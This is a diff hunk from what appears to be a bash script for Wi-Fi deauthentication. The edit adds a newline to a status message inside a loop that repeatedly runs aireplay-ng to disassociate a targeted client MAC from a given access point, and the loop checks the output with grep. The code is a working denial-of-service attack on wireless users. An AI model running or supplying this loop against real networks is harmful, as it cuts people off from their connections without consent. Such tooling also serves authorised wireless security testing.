@@ -185,7 +185,7 @@ clear
 
 
 while true; do
-    printf "Attemping to dissasociate \e[1;97m$MAC\e[0m..."
+    printf "Attemping to dissasociate \e[1;97m$MAC\e[0m...\n"
     aireout=$(sudo aireplay-ng -0 100 -a $BSSID -c $MAC $INF | tee /dev/tty) # Running the aireplay attack into a variable aireout so grep can read the output
     
     if echo "$aireout" | grep -q "No such BSSID available"; then
